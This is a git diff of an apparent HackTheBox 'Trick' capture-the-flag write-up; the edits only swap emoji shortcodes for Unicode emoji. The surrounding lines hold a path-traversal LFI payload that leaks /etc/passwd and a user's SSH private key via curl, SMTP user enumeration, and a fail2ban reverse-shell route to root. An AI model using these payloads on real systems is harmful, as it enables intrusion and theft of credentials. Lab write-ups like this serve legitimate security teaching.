@@ -131,7 +131,7 @@ telnet $RADDR 25
 
 I did not know what all the smtp status codes were, so I checked the [wiki](https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes). There was an example shown at the bottom of that wiki article showing how to interact with the server using these codes. Noting that the nmap enumeration showed `ENHANCEDSTATUSCODES` I referred to the bottom example for sending a message. I also tried checking some users (root, admin, mailto). 
 
-> :bulb: If this worked, then perhaps the usernames could be enumerated using this VRFY command..?
+> 💡 If this worked, then perhaps the usernames could be enumerated using this VRFY command..?
 
 ```
 └─$ telnet $RADDR 25                                                                            
@@ -192,7 +192,7 @@ QUIT
 Connection closed by foreign host.
 ```
 
-To investigate this idea, I checked through metasploit to see if somebody has already tried this method. As it turns out, it already has a module! `auxiliary/scanner/smtp/smtp_enum` :tada:
+To investigate this idea, I checked through metasploit to see if somebody has already tried this method. As it turns out, it already has a module! `auxiliary/scanner/smtp/smtp_enum` 🎉
 
 ```
 use auxiliary/scanner/smtp/smtp_enum
@@ -441,7 +441,7 @@ I manually created a POST request in Burp Repeater for this and submitted it. Th
 
 Ok... Not the result I was looking for, but at least now we know more about the directory structure.
 
-> :bulb: But it does remind me of something important... you can't have a company without more than just payroll. I realized that I forgot to refine my VHost fuzzing after finding the suspicious preprod-**payroll**.trick.htb from DNS enumeration.
+> 💡 But it does remind me of something important... you can't have a company without more than just payroll. I realized that I forgot to refine my VHost fuzzing after finding the suspicious preprod-**payroll**.trick.htb from DNS enumeration.
 >
 
 Taking another crack at VHost fuzzing using the known pattern of preprod-XXX.trick.htb:
@@ -453,7 +453,7 @@ ffuf -w $WLIST:FUZZ -u http://trick.htb -H 'Host: preprod-FUZZ.trick.htb' -t 100
 
 ![vhost fuzzing again](vhost fuzzing again.png)
 
-:man_facepalming: Of course! why didn't I think of checking that earlier.
+🤦‍♂ Of course! why didn't I think of checking that earlier.
 
 > I try not to beat myself up over doing things in the wrong order, but it can sure be frustrating to realize I neglected something staring right at me!
 >
@@ -496,7 +496,7 @@ And that did it! The second attempt was enough to leak ``/etc/passwd``:
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash 
 ```
 
-Well hello there, **michael** :wave: Are you the target?
+Well hello there, **michael** 👋 Are you the target?
 
 As it turns out, *michael is definitely the target*. Or at least, they have the flag:
 
@@ -512,7 +512,7 @@ If I can access michael's home directory (and ssh is open) there's a good chance
 http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa
 ```
 
-Hooray :tada: That worked! Only the formatting of the ssh key is not idea. I'll use curl to dump it into a file directly, instead:
+Hooray 🎉 That worked! Only the formatting of the ssh key is not idea. I'll use curl to dump it into a file directly, instead:
 
 ```bash
 curl http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././home/michael/.ssh/id_rsa -o id_rsa
@@ -608,7 +608,7 @@ Perhaps there is a way to use fail2ban to escalate? pspy showed that /root/fail2
 
 Fail2Ban appears to have had a pretty severe CVE leading to code execution: [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm). However, this git repo shows that ``mail`` is used, and ``mail`` is not present on this box. Neither is the leading alternative ``sendmail``... neither are the less-common alternatives ``mutt`` nor ``ssmtp``.
 
-:bulb:But wait, maybe that telnet trick that I used earlier would be enough to exploit CVE-2021-32749 ? 
+💡But wait, maybe that telnet trick that I used earlier would be enough to exploit CVE-2021-32749 ? 
 
 First, I set up a nc listener and checked if a netcat reverse shell would even work on this box (sometimes they don't have the -e flag):
 
@@ -745,7 +745,7 @@ Then I restarted the service:
 sudo /etc/init.d/fail2ban restart
 ```
 
-but... still no reverse shell :confused: 
+but... still no reverse shell 😕 
 
 Next, I tried putting my reverse shell inside of the unban action instead. But now I need to find a way to get banned. As seen previously in ``jail.conf``, I will be banned by performing 5 failed authentication attempts in a 10 second span. That's tricky, actually I think that's impossible if trying to log in the naive way. Instead, I tried make at least 5 login attempts at once using a python script:
 
@@ -771,17 +771,17 @@ So the plan of attack is as follows, and it has to be very quick:
 
 3. From my attacker machine, make a bunch of failed login attempts as fast as possible using my python script
 
-4. :pray: pray for reverse shell
+4. 🙏 pray for reverse shell
 
 5. If I get it, quickly grab the flag. I need to be faster than the anacron job that overwrites ``/etc/fail2ban``.
 
    
 
-Performing the above steps worked perfectly! :tada: root shell acquired!
+Performing the above steps worked perfectly! 🎉 root shell acquired!
 
 ![got_root](got_root.png)
 
-... for like 5 whole seconds. Then the connection was terminated :disappointed:
+... for like 5 whole seconds. Then the connection was terminated 😞
 
 So to get a ***persistent*** root shell, I repeated the above steps. This time quickly copying-over root's ssh key into a place michael can access:
 
@@ -813,7 +813,7 @@ Then on my attacker machine I changed the key's permissions with ``chmod 700 roo
 
 ![root shell over ssh](root shell over ssh.png)
 
-YES! Finally a nice solid ssh connection as root:tada:
+YES! Finally a nice solid ssh connection as root🎉
 
 
 
